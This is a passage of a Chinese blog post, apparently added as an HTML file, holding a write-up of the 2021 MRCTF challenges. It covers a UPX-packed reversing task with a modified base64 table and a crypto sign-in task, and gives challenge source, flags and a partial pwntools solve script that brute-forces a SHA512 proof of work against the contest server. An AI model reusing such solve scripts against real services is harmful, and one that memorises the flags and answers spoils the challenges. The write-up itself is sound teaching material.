@@ -1,0 +1,1920 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="CTF | 2021 MRCTF WriteUp, MiaoTony,blog">
+    <meta name="description" content="前几天看北邮天璇Merak战队整了个招新赛，喵喵也来随便玩玩好了！题目还是比较顶的，巨大多“签到”题目，然而喵喵并不能check in...">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-159946730-1"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() {
+        dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', 'UA-159946730-1');
+</script>
+
+
+    <title>CTF | 2021 MRCTF WriteUp | MiaoTony&#39;s小窝</title>
+    <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/favicon.ico">
+
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/awesome/css/all.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/css/matery.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/css/my.css">
+	
+    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/jquery/jquery.min.js"></script>
+    <script>
+        //来个特效玩玩喵 20200123
+        var titleTime;
+        var OriginTitile = document.title;
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                document.title = '|ω·) 喵~快回来呀！';
+                clearTimeout(titleTime);
+            } else {
+                document.title = '(/≧▽≦)/ Meow！';
+                titleTime = setTimeout(function() {
+        	    document.title = OriginTitile;
+        }, 800);
+    }
+        });
+    </script>
+<meta name="generator" content="Hexo 5.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="MiaoTony's小窝" type="application/atom+xml">
+</head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">MiaoTony&#39;s小窝</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友链</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">MiaoTony&#39;s小窝</div>
+        <div class="logo-desc">
+            
+            喵~欢迎各位大佬的来访呀！
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友链
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/miaotony" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/miaotony" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+<script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/medias/featureimages/6.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">CTF | 2021 MRCTF WriteUp</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        min-width: 240px;
+        padding-left: 15px;
+        padding-bottom: 30px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 30px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+	    max-height: 450px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/CTF/">
+                                <span class="chip bg-color">CTF</span>
+                            </a>
+                        
+                            <a href="/tags/WriteUp/">
+                                <span class="chip bg-color">WriteUp</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/CTF/" class="post-category">
+                                CTF
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2021-04-15
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    2.8k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    14 分
+                </div>
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p><img src="/2021/04/15/CTF_2021MRCTF/image-20210414230156814.png"></p>
+<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><blockquote>
+<p><strong>2021 MRCTF</strong></p>
+<p><a target="_blank" rel="noopener" href="https://2021.mrctf.fun/">https://2021.mrctf.fun/</a></p>
+<p><strong>比赛时间</strong></p>
+<p>2021-04-10 9：00 - 2021-4-11 21：00</p>
+<p><strong>比赛规则</strong></p>
+<p>单人解题赛</p>
+</blockquote>
+<p>前几天看北邮 天璇Merak 战队整了个招新赛，喵喵也来随便玩玩好了！</p>
+<p>什么鬼招新赛嘛，怎么巨大多 check in 题目，然而喵喵并不能 check in……</p>
+<p>喵呜，题目还是比较顶的，喵喵确实也不会做什么，大哭。</p>
+<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="Real-CHECKIN"><a href="#Real-CHECKIN" class="headerlink" title="Real_CHECKIN"></a>Real_CHECKIN</h3><p>直接丢进 IDA 发现只有一个 entry，看来是加壳了。</p>
+<p>丢进 FUPX 里一看，果然加了 UPX 壳。</p>
+<p><img src="/2021/04/15/CTF_2021MRCTF/image-20210410221618087.png"></p>
+<p>脱一下壳，再扔进 IDA。</p>
+<p><img src="/2021/04/15/CTF_2021MRCTF/image-20210410221654708.png"></p>
+<p><code>tvjdvez7D0vSyZbnzv90mf9nuKnurL8YBZiXiseHFq==</code> 直接拿去 base64 解码发现是乱码。看来是魔改的 base64 了。</p>
+<p><img src="/2021/04/15/CTF_2021MRCTF/image-20210410224735510.png"></p>
+<p>发现编码表里 大小写反过来了……草！</p>
+<p><img src="/2021/04/15/CTF_2021MRCTF/image-20210410224700889.png"></p>
+<p>于是大小写反过来，改一下编码表，再拿去 base64 解码就能拿 flag 了。</p>
+<p><code>MRCTF{wElc0Me_t0_MRCTF_2o21!!!}</code></p>
+<blockquote>
+<p><strong>Extensive Reading:</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/database/140773.html">爆破非默认Base64编码表</a></p>
+</blockquote>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="friendly-sign-in"><a href="#friendly-sign-in" class="headerlink" title="friendly_sign-in"></a>friendly_sign-in</h3><blockquote>
+<p>ez sign-in, just come and get the flag!<br> nc node.mrctf.fun 10007</p>
+<p>Mirrors:</p>
+<ul>
+<li>host, port = ‘nairw.top’, 4800</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://drive.buptmerak.cn/s/BTx9QNNskyKwnYH">https://drive.buptmerak.cn/s/BTx9QNNskyKwnYH</a></p>
+</blockquote>
+<p>源码</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> hashlib <span class="token keyword">import</span> sha512
+<span class="token keyword">from</span> random <span class="token keyword">import</span> choices
+<span class="token keyword">from</span> flag <span class="token keyword">import</span> flag
+<span class="token keyword">import</span> string
+
+
+Bits <span class="token operator">=</span> <span class="token number">512</span>
+length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span>
+
+
+<span class="token keyword">def</span> <span class="token function">proof_of_work</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bool</span><span class="token punctuation">:</span>
+    alphabet <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits
+    head <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>choices<span class="token punctuation">(</span>alphabet<span class="token punctuation">,</span> k<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'POW: SHA512("</span><span class="token interpolation"><span class="token punctuation">{</span>head<span class="token punctuation">}</span></span><span class="token string">" + ?) starts with "11111"'</span></span><span class="token punctuation">)</span>
+    tail <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    message <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> sha512<span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"11111"</span><span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">check_ans</span><span class="token punctuation">(</span>_N<span class="token punctuation">,</span> _x<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bool</span><span class="token punctuation">:</span>
+    check <span class="token operator">=</span> <span class="token number">0</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>_N<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        check <span class="token operator">+=</span> _N<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> _x<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
+    <span class="token keyword">return</span> check <span class="token operator">==</span> <span class="token number">0</span>
+
+
+<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token keyword">not</span> proof_of_work<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Welcome to MRCTF2021, enjoy this friendly sign-in question~"</span><span class="token punctuation">)</span>
+    flag_bits <span class="token operator">=</span> <span class="token builtin">bin</span><span class="token punctuation">(</span>bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
+    N <span class="token operator">=</span> <span class="token punctuation">[</span>getPrime<span class="token punctuation">(</span>Bits<span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">]</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'N ='</span><span class="token punctuation">,</span> N<span class="token punctuation">)</span>
+    X <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">]</span>
+        <span class="token keyword">if</span> x <span class="token keyword">in</span> X<span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'No cheat!'</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span>
+        <span class="token keyword">if</span> x<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'No trivial!'</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span>
+        <span class="token keyword">if</span> <span class="token keyword">not</span> check_ans<span class="token punctuation">(</span>N<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Follow the rule!'</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span>
+        X<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'your gift:'</span><span class="token punctuation">,</span> flag_bits<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+
+main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>其实这个思路很简单，只需要生成 </p>
+<ul>
+<li>不重复 </li>
+<li>每个数都不为0 </li>
+<li>对应位置数字的乘积累加和为0 </li>
+</ul>
+<p>这样的序列就可以了。</p>
+<p>那么怎么生成呢？</p>
+<p>其实只需要任意 (length/2) 对数字交换一下，正负号交替一下，就能实现乘积累加和为 0 了。</p>
+<p>那怎么不重复呢？</p>
+<p>喵喵想了有一段时间，到最后一想，直接随机产生下标，把映射关系存一下，要是已经存在了冲突了就重新产生就完事了呀！</p>
+<p>另外有个麻烦的地方就是交互吧，输入 224*224 个数字，跑起来都挺久的……</p>
+<p><strong>Exp:</strong></p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> hashlib <span class="token keyword">import</span> sha512
+<span class="token keyword">from</span> random <span class="token keyword">import</span> choices
+<span class="token keyword">import</span> string
+<span class="token keyword">from</span> tqdm <span class="token keyword">import</span> tqdm
+<span class="token keyword">from</span> pwnlib<span class="token punctuation">.</span>util<span class="token punctuation">.</span>iters <span class="token keyword">import</span> mbruteforce
+
+sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'nairw.top'</span><span class="token punctuation">,</span> <span class="token number">4800</span><span class="token punctuation">)</span>
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
+
+
+<span class="token keyword">def</span> <span class="token function">proof_of_work</span><span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"SHA512(\""</span><span class="token punctuation">)</span>
+    head <span class="token operator">=</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>  <span class="token comment"># .decode('utf-8')</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"head:"</span><span class="token punctuation">,</span> head<span class="token punctuation">)</span>
+    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'with \"11111\"'</span><span class="token punctuation">)</span>
+    <span class="token keyword">for</span> a <span class="token keyword">in</span> tqdm<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x7f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">for</span> b <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x7f</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x7f</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                <span class="token keyword">for</span> d <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x7f</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                    rest <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>
+                    m <span class="token operator">=</span> <span class="token punctuation">(</span>head<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token operator">+</span> rest<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
+                    <span class="token keyword">if</span> sha512<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"11111"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nrest:'</span><span class="token punctuation">,</span> rest<span class="token punctuation">)</span>
+                        sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>rest<span class="token punctuation">)</span>
+                        <span class="token comment"># sh.recvuntil('again...God bless you get it...')</span>
+                        <span class="token keyword">return</span>
+    <span class="token comment"># proof = mbruteforce(lambda x: sha512((head + x).encode('utf-8')).hexdigest().startswith(</span>
+    <span class="token comment">#     "11111"), string.ascii_letters + string.digits, length=4, method='fixed')</span>
+    <span class="token comment"># print('rest:', proof)</span>
+    <span class="token comment"># sh.sendline(proof)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">generate_idx</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token triple-quoted-string string">"""
+    随机生成对换的下标 dict
+    """</span>
+    idx_list <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    idx_result <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
+    <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token operator">//</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+            r <span class="token operator">=</span> choices<span class="token punctuation">(</span>idx_list<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+            t <span class="token operator">=</span> choices<span class="token punctuation">(</span>idx_list<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
